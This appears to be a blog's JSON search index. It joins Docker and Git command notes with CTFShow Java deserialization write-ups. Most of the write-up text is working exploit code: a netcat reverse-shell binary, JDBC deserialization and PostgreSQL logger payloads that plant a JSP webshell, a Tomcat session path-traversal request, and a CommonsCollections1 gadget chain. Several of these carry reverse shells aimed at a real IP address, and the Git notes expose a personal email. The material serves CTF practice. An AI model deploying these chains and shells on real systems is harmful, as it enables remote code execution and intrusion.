% md5 -s '/var/www/html/wap/top.php' MD5 (\"/var/www/html/wap/top.php\") = eeff2eabfd9b7a6d26fc1a53d3f7d1de flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de} ","date":"2024-01-31","objectID":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/:0:0","tags":["webshell查杀"],"title":"第一章-应急响应Webshell查杀","uri":"/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/"},{"categories":["运维"],"content":" Docker的常用命令","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:0:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 帮助命令 docker version #显示 docker 的版本 docker info #显示 docker 的系统信息：包括镜像和容器的数量 docker 命令 --help #帮助命令 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:1:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 镜像命令docker images 查看所有镜像 f10wers13eicheng@MacBookPro [12时12分59秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker images REPOSITORY TAG IMAGE ID CREATED SIZE hello-world latest feb5d9fea6a5 2 years ago 13.3kB # 解释 REPOSITORY 镜像的仓库源 TAG 镜像的标签 IMAGE ID 镜像的id CREATED 镜像的创建时间 SIZE 镜像的大小 -a # 列出所有镜像 -q # 显示镜像id docker search 镜像名 搜索镜像 f10wers13eicheng@MacBookPro [12时25分22秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker search mysql NAME DESCRIPTION STARS OFFICIAL AUTOMATED mysql MySQL is a widely used, open-source relation… 14805 [OK] mariadb MariaDB Server is a high performing open sou… 5653 [OK] percona Percona Server is a fork of the MySQL relati… 623 [OK] phpmyadmin phpMyAdmin - A web interface for MySQL and M… 934 [OK] bitnami/mysql Bitnami MySQL Docker Image 106 [OK] bitnami/mysqld-exporter 6 cimg/mysql 3 ubuntu/mysql MySQL open source fast, stable, multi-thread… 58 rapidfort/mysql RapidFort optimized, hardened image for MySQL 25 rapidfort/mysql8-ib RapidFort optimized, hardened image for MySQ… 9 google/mysql MySQL server for Google Compute Engine 25 [OK] rapidfort/mysql-official RapidFort optimized, hardened image for MySQ… 9 elestio/mysql Mysql, verified and packaged by Elestio 0 hashicorp/mysql-portworx-demo 0 bitnamicharts/mysql 0 databack/mysql-backup Back up mysql databases to... anywhere! 105 linuxserver/mysql A Mysql container, brought to you by LinuxSe… 41 mirantis/mysql 0 docksal/mysql MySQL service images for Docksal - https://d… 0 linuxserver/mysql-workbench 54 vitess/mysqlctld vitess/mysqlctld 1 [OK] eclipse/mysql Mysql 5.7, curl, rsync 1 [OK] drupalci/mysql-5.5 https://www.drupal.org/project/drupalci 3 [OK] drupalci/mysql-5.7 https://www.drupal.org/project/drupalci 0 datajoint/mysql MySQL image pre-configured to work smoothly … 2 [OK] docker pull 镜像名[:tag] 下载镜像 f10wers13eicheng@MacBookPro [12时25分27秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker pull mysql # 不写 tag 默认就是 latest Using default tag: latest latest: Pulling from library/mysql 72a69066d2fe: Pull complete #分层下载 docker images的核心 93619dbc5b36: Pull complete 99da31dd6142: Pull complete 626033c43d70: Pull complete 37d5d7efb64e: Pull complete ac563158d721: Pull complete d2ba16033dad: Pull complete 688ba7d5c01a: Pull complete 00e060b6d11d: Pull complete 1c04857f594f: Pull complete 4d7cfa90e6ea: Pull complete e0431212d27d: Pull complete Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709 # 签名信息 Status: Downloaded newer image for mysql:latest docker.io/library/mysql:latest #真实地址 # 等价于 docker pull mysql docker pull docker.io/library/mysql:latest docker rmi 镜像id 删除镜像 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:2:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 容器命令docker pull centos 下载centos镜像 docker run [可选参数] image # 参数说明 --name=\"Name\" #容器名字 -d #后台方式运行 -it #是用交互方式运行，进入容器查看内容 -p #指定容器的端口 -p 8080:8080 -p ip:主机端口:容器端口 -p 主机端口:容器端口 -p 容器端口 -P #随机指定端口 # 启动并进入容器 f10wers13eicheng@MacBookPro [12时35分17秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker run -it centos /bin/bash [root@a9def1b9102e /]# ls # 查看容器内的目录 bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var [root@a9def1b9102e /]# whoami root [root@a9def1b9102e /]# exit #从容器中退回主机 列出所有运行的容器 docker ps 命令 -a #列出当前正在运行的容器 + 带历史运行过的容器 -n=? #显示最近创建的容器 -q #显示容器id exit 直接容器停止并退出 Ctrl + P + Q 容器不停止但退出 删除容器 docker rm 容器id #删除指定容器 docker rm -f $(docker ps -aq) #删除所有容器 启动和停止容器的操作 docker start 容器id #启动容器 docker restart 容器id #重启容器 docker stop 容器id #停止容器 docker kill 容器id #停止当前运行的容器并删除 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:3:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 常用的其他命令后台启动容器 # docker run -d 镜像名 f10wers13eicheng@MacBookPro [12时46分50秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker run -d centos 8587f88f16bbc5fdb9dfb6de01c5173d9c25c23ed1f99d11b1d52575167cbefa f10wers13eicheng@MacBookPro [12时46分58秒] [/Library/Java/JavaVirtualMachines] -\u003e % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES # docker ps发现 centos停止了 # 常见的坑 docker容器使用后台运行，就必须要有一个前台进程 docker 发现没有应用，就会自动停止 # nginx，容器启动后，发现自己没有提供服务，就会立刻停止。 查看日志 docker logs # 查看日志信息 docker logs -tf 容器id # 显示日志 -tf # 显示日志 --tail # 显示日志条数 查看容器中进程信息 docker top 容器id 查看容器的元数据 docker inspect 容器id 进入当前正在运行的容器 # 通常容器都是使用后台方式运行的，需要进入容器，修改一些配置 # 命令 docker exec -it 容器id /bin/bash #进入容器后开启一个新的终端 docker attach 容器id # 进入容器正在执行的终端，不会启动一个新的进程 从容器内拷贝文件到主机上 docker cp 容器id:容器内路径 目的主机路径 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:4:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 部署 nginx - Docker练习docker search nginx 搜索镜像 docker pull nginx 下载镜像 docker run -d --name nginx01 -p 3344:80 nginx 启动镜像 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:5:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 部署 tomcat - Docker练习docker pull tomcat docker run -d --name tomcat01 -p 3345:8080 tomcat docker exec -it tomcat01 /bin/bash 进入容器 ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:6:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" Es+Kibana - Docker练习 # --net 网络配置 $ docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" elasticsearch:7.6.2 docker stats # 查看cpu状态 -e #环境配置修改 Docker 镜像如何得到镜像？ 从远程仓库下载 自己制作一个 Dockerfile ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:7:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" 镜像加载原理UnionFS(联合文件系统) ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:8:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" commit镜像 docker commit 提交容器称为一个新的副本 docker commit -m=\"提交的描述信息\" -a=\"作者\" 容器id 目标镜像名:[TAG] ","date":"2024-01-30","objectID":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/:9:0","tags":["Docker"],"title":"Docker基础命令及原理","uri":"/docker%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8E%9F%E7%90%86/"},{"categories":["运维"],"content":" Git的必要配置git config -l 查看配置文件 git config --system --list 查看系统的git配置文件 git config --global --list 查看当前用户配置 设置用户名和邮箱 user.email=beichenghua@gmail.com user.name=nlrvana ","date":"2024-01-25","objectID":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","tags":["Git"],"title":"Git学习记录","uri":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["运维"],"content":" Git项目创建git init 初始化文件 git clone 克隆文件到本地 git add . 放至暂存区 git commit -m \"message\" 提交暂存区的内容到本地仓库 ","date":"2024-01-25","objectID":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","tags":["Git"],"title":"Git学习记录","uri":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["运维"],"content":" Git分支 # 列出所有本地分支 git branch # 列出所有远程分支 git branch -r # 新建一个分支，并切换到该分支 git checkout -b [branch] # 合并指定分支到当前分支 git merge [branch] # 删除分支 git branch -d [branch-name] # 删除远程分支 git push origin --delete [branch-name] git branch -dr [remote/branch] ","date":"2024-01-25","objectID":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","tags":["Git"],"title":"Git学习记录","uri":"/git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["Java"],"content":" Web855 import java.io.*; public class User implements Serializable { private static final long serialVersionUID = 0x36d; private String username; private String password; public User(String username, String password) { this.username = username; this.password = password; } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } private static final String OBJECTNAME=\"ctfshow\"; private static final String SECRET=\"123456\"; private static String shellCode=\"chmod +x ./\"+OBJECTNAME+\" \u0026\u0026 ./\"+OBJECTNAME; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { int magic = in.readInt(); if(magic==2135247942){ byte var1 = in.readByte(); switch (var1){ case 1:{ int var2 = in.readInt(); if(var2==0x36d){ FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME); fileOutputStream.write(new byte[]{0x7f,0x45,0x4c,0x46}); byte[] temp = new byte[1]; while((in.read(temp))!=-1){ fileOutputStream.write(temp); } fileOutputStream.close(); in.close(); } break; } case 2:{ ObjectInputStream.GetField gf = in.readFields(); String username = (String) gf.get(\"username\", null); String password = (String) gf.get(\"password\",null); username = username.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); password = password.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); User var3 = new User(username,password); User admin = new User(OBJECTNAME,SECRET); if(var3 instanceof User){ if(OBJECTNAME.equals(var3.getUsername())){ throw new RuntimeException(\"object unserialize error\"); } if(SECRET.equals(var3.getPassword())){ throw new RuntimeException(\"object unserialize error\"); } if(var3.equals(admin)){ Runtime.getRuntime().exec(shellCode); } }else{ throw new RuntimeException(\"object unserialize error\"); } break; } default:{ throw new RuntimeException(\"object unserialize error\"); } } } } @Override public boolean equals(Object o) { if (this == o) return true; if (!(o instanceof User)) return false; User user = (User) o; return this.hashCode() == user.hashCode(); } @Override public int hashCode() { return username.hashCode()+password.hashCode(); } } 来审计一下代码 User类继承了Serializable接口，说明可以被序列化 public class User implements Serializable 定义了三个静态变量无法被改变 private static final String OBJECTNAME=\"ctfshow\"; private static final String SECRET=\"123456\"; private static String shellCode=\"chmod +x ./\"+OBJECTNAME+\" \u0026\u0026 ./\"+OBJECTNAME; 并重写了equals()和hashCode()方法 @Override public boolean equals(Object o) { if (this == o) return true; if (!(o instanceof User)) return false; User user = (User) o; return this.hashCode() == user.hashCode(); } @Override public int hashCode() { return username.hashCode()+password.hashCode(); } 接下来最后看反序列化入口点readObject()方法 private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { int magic = in.readInt(); if(magic==2135247942){ byte var1 = in.readByte(); switch (var1){ case 1:{ int var2 = in.readInt(); if(var2==0x36d){ FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME); fileOutputStream.write(new byte[]{0x7f,0x45,0x4c,0x46}); byte[] temp = new byte[1]; while((in.read(temp))!=-1){ fileOutputStream.write(temp); } fileOutputStream.close(); in.close(); } break; } case 2:{ ObjectInputStream.GetField gf = in.readFields(); String username = (String) gf.get(\"username\", null); String password = (String) gf.get(\"password\",null); username = username.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); password = password.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); User var3 = new User(username,password); User admin = new User(OBJECTNAME,SECRET); if(var3 instanceof User){ if(OBJECTNAME.equals(var3.getUsername())){ throw new RuntimeException(\"object unserialize error\"); } if(SECRET.equals(var3.getPassword())){ throw new RuntimeException(\"object unserialize error\"); } if(var3.equals(admin)){ Runtime.getRuntime().exec(shellCode); } }else{ throw new RuntimeException(\"object unserialize error\"); } break; } default:{ throw new RuntimeException(\"object unserialize error\"); } } } } 有两个点，第一个点会写入一个文件，并且开头是0x7f,0x45,0x4c,0x46，这是elf文件的开头 case 1:{ int var2 = in.readInt(); if(var2==0x36d){ FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME); fileOutputStream.write(new byte[]{0x7f,0x45,0x4c,0x46}); byte[] temp = new byte[1]; while((in.read(temp))!=-1){ fileOutputStream.write(temp); } fileOutputStream.close(); in.close(); } break; } 第二个点，绕过if条件，会执行shellcode这个变量 case 2:{ ObjectInputStream.GetField gf = in.readFields(); String username = (String) gf.get(\"username\", null); String password = (String) gf.get(\"password\",null); username = username.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); password = password.replaceAll(\"[\\\\p{C}\\\\p{So}\\uFE00-\\uFE0F\\\\x{E0100}-\\\\x{E01EF}]+\", \"\") .replaceAll(\" {2,}\", \" \"); User var3 = new User(username,password); User admin = new User(OBJECTNAME,SECRET); if(var3 instanceof User){ if(OBJECTNAME.equals(var3.getUsername())){ throw new RuntimeException(\"object unserialize error\"); } if(SECRET.equals(var3.getPassword())){ throw new RuntimeException(\"object unserialize error\"); } if(var3.equals(admin)){ Runtime.getRuntime().exec(shellCode); } }else{ throw new RuntimeException(\"object unserialize error\"); } break; } shellcode private static String shellCode=\"chmod +x ./\"+OBJECTNAME+\" \u0026\u0026 ./\"+OBJECTNAME; 会赋予ctfshow这个文件执行权限，并且执行 现在的思路就是写入一个elf文件，并且执行 构造poc 本地写一个c文件程序 #include\u003cstdlib.h\u003e int main() { system(\"nc ip port -e /bin/sh\"); return 0; } 编译一下gcc shellcode.c -o shellcode 接着再把前四个字节删掉 利用反序列化写入，在此之前，还有几个if条件需要绕过 if(var3 instanceof User){ if(OBJECTNAME.equals(var3.getUsername())){ throw new RuntimeException(\"object unserialize error\"); } if(SECRET.equals(var3.getPassword())){ throw new RuntimeException(\"object unserialize error\"); } if(var3.equals(admin)){ Runtime.getRuntime().exec(shellCode); 实例化传入的username和password不能是ctfshow和123456，但是hash比较的时候又相等。 这个时候需要用到Java里的hash碰撞 def hashcode(val): h=0 for i in range(len(val)): h=31 * h + ord(val[i]) return h t=\"ct\" #t=\"12\" for k in range(1,128): for l in range(1,128): if t!=(chr(k)+chr(l)): if(hashcode(t)==hashcode(chr(k)+chr(l))): print(t,chr(k)+chr(l)) 得到 ct,dU 12,0Q 构造完整的Poc package com.ctfshow; import com.ctfshow.entity.User; import java.io.*; import java.util.Base64; public class Vuln { public static void main(String[] args) throws Exception{ User user = new User(\"dUfshow\",\"0Qahua\"); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(user); String payload = Base64.getEncoder().encodeToString(baos.toByteArray()); System.out.println(payload); } } 重写的writeObject private void writeObject(ObjectOutputStream out) throws Exception{ out.writeInt(2135247942); out.writeByte(1); //执行RCE的时候，将这里改成2下面注释掉即可 /////////////////////////// out.writeInt(0x36d); File filename = new File(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/bash\"); BufferedInputStream in = new BufferedInputStream(new FileInputStream(filename)); byte[] temp = new byte[1024]; int size = 0; while((size = in.read(temp)) != -1){ out.write(temp,0,size); } in.close(); ///////////////////////// out.defaultWriteObject(); } ","date":"2024-01-22","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/:1:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(2)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/"},{"categories":["Java"],"content":" Web856考察jdbc反序列化 package com.ctfshow.entity; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; import java.sql.DriverManager; import java.sql.SQLException; import java.util.Objects; public class Connection implements Serializable { private static final long serialVersionUID = 2807147458202078901L; private String driver; private String schema; private String host; private int port; private User user; private String database; public String getDriver() { return driver; } public void setDriver(String driver) { this.driver = driver; } public String getSchema() { return schema; } public void setSchema(String schema) { this.schema = schema; } public void setPort(int port) { this.port = port; } public String getHost() { return host; } public void setHost(String host) { this.host = host; } public User getUser() { return user; } public void setUser(User user) { this.user = user; } public String getDatabase() { return database; } public void setDatabase(String database) { this.database = database; } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, SQLException { Class.forName(\"com.mysql.jdbc.Driver\"); ObjectInputStream.GetField gf = in.readFields(); String host = (String) gf.get(\"host\", \"127.0.0.1\"); int port = (int) gf.get(\"port\",3306); User user = (User) gf.get(\"user\",new User(\"root\",\"root\")); String database = (String) gf.get(\"database\", \"ctfshow\"); String schema = (String) gf.get(\"schema\", \"jdbc:mysql\"); DriverManager.getConnection( schema+\"://\"+host+\":\"+port+\"/?\"+database+\"\u0026user=\"+user.getUsername()); } @Override public boolean equals(Object o) { if (this == o) return true; if (!(o instanceof Connection)) return false; Connection that = (Connection) o; return Objects.equals(host, that.host) \u0026\u0026 Objects.equals(port, that.port) \u0026\u0026 Objects.equals(user, that.user) \u0026\u0026 Objects.equals(database, that.database); } @Override public int hashCode() { return Objects.hash(host, port, user, database); } }``` 漏洞出现在这里 ```java private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, SQLException { Class.forName(\"com.mysql.jdbc.Driver\"); ObjectInputStream.GetField gf = in.readFields(); String host = (String) gf.get(\"host\", \"127.0.0.1\"); int port = (int) gf.get(\"port\",3306); User user = (User) gf.get(\"user\",new User(\"root\",\"root\")); String database = (String) gf.get(\"database\", \"ctfshow\"); String schema = (String) gf.get(\"schema\", \"jdbc:mysql\"); DriverManager.getConnection( schema+\"://\"+host+\":\"+port+\"/?\"+database+\"\u0026user=\"+user.getUsername()); } 直接进行 JDBC 反序列化 利用工具 https://github.com/fnmsd/MySQL_Fake_Server package com.ctfshow; import com.ctfshow.entity.Connection; import com.ctfshow.entity.User; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; public class Vuln{ public static void main(String[] args) throws Exception{ Connection connection = new Connection(); setFieldValue(connection,\"host\",\"124.220.215.8\"); //vps 地址 setFieldValue(connection,\"port\",3300); //vps端口 setFieldValue(connection,\"user\",new User(\"huahua\",\"1\")); setFieldValue(connection,\"schema\",\"jdbc:mysql\"); setFieldValue(connection,\"database\",\"detectCustomCollations=true\u0026autoDeserialize=true\"); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream ois = new ObjectOutputStream(baos); ois.writeObject(connection); String payload = Base64.getEncoder().encodeToString(baos.toByteArray()); System.out.println(payload); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } ","date":"2024-01-22","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/:2:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(2)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/"},{"categories":["Java"],"content":" Referencehttps://tttang.com/archive/1877/#toc_2serverstatusdiffinterceptor https://xz.aliyun.com/t/8159 ","date":"2024-01-22","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/:2:1","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(2)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/"},{"categories":["Java"],"content":" Web857 javax.servlet-api 4.0.1 mysql-connector-java 5.1.39 postgresql 42.3.1 其中postgresql 42.3.1存在漏洞 https://forum.butian.net/share/1339 构造Poc package com.ctfshow; import com.ctfshow.entity.Connection; import com.ctfshow.entity.User; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; public class Vuln{ public static void main(String[] args) throws Exception{ Connection connection = new Connection(); setFieldValue(connection,\"driver\",\"org.postgresql.Driver\"); setFieldValue(connection,\"host\",\"124.220.215.8\"); //vps 地址 setFieldValue(connection,\"port\",3300); //vps端口 setFieldValue(connection,\"user\",new User(\"huahua\",\"1\")); setFieldValue(connection,\"schema\",\"jdbc:postgresql\"); setFieldValue(connection,\"database\",\"loggerLevel=DEBUG\u0026loggerFile=../webapps/ROOT/hack.jsp\u0026\u003c%Runtime.getRuntime().exec(request.getParameter(\\\"huahua\\\"));%\u003e\"); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream ois = new ObjectOutputStream(baos); ois.writeObject(connection); String payload = Base64.getEncoder().encodeToString(baos.toByteArray()); System.out.println(payload); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 写入后，访问/hack.jsp 传入huahua=nc 124.220.215.8 1234 -e /bin/sh ","date":"2024-01-22","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/:3:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(2)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/"},{"categories":["Java"],"content":" Web858tomcat的session反序列化 https://www.freebuf.com/articles/web/242782.html User类中存在readObject的点，并且存在RCE package com.ctfshow.entity; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class User implements Serializable { private static final long serialVersionUID = -3254536114659397781L; private String username; private String password; public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); Runtime.getRuntime().exec(this.username); } } 根据上面的复现文章，尝试打一下 构造Poc package com.ctfshow; import com.ctfshow.entity.User; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; public class Vuln1 { public static void main(String[] args) throws Exception { User user = new User(); Field username = user.getClass().getDeclaredField(\"username\"); username.setAccessible(true); username.set(user,\"cp /flag /usr/local/tomcat/webapps/ROOT/flag.txt\"); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"test.session\")); oos.writeObject(user); } } 上传文件后，得到目录 /usr/local/tomcat/webapps/ROOT/WEB-INF/upload/huahua 利用curl请求，再触发一下 curl 'http://fdff0a06-5233-4da3-94ab-f6b39075f072.challenge.ctf.show/' -H \"Cookie: JSESSIONID=../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/upload/test\" ","date":"2024-01-22","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/:4:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(2)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/"},{"categories":["Java"],"content":" Web846 打开首页，告诉我们是dns查询，所以直接用URLDNS这条链子 package org.example; import java.io.*; import java.lang.reflect.Field; import java.net.URL; import java.util.Base64; import java.util.HashMap; public class URLDNS { public static void main(String[] args) throws Exception { HashMap h=new HashMap(); URL url=new URL(\"http://7c4597d6-3233-40c6-a484-176b02c0ecff.challenge.ctf.show/\"); Class cls=Class.forName(\"java.net.URL\"); Field f = cls.getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url,1); h.put(url,1); f.set(url,-1); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(h); String payload = Base64.getEncoder().encodeToString(b.toByteArray()); System.out.println(payload); } } ","date":"2024-01-19","objectID":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/:1:0","tags":["CTFSHOW"],"title":"CTFShow-Java反序列化篇(1)","uri":"/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"},{"categories":["Java"],"content":" Web847https://x.hacking8.com/java-runtime.html Java7 commons-collections 3.1 用CC1的链， package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjAuMjE1LjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); map.put(\"value\", \"value\"); Map\u003cObject, Object\u003e transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(o); String payload = 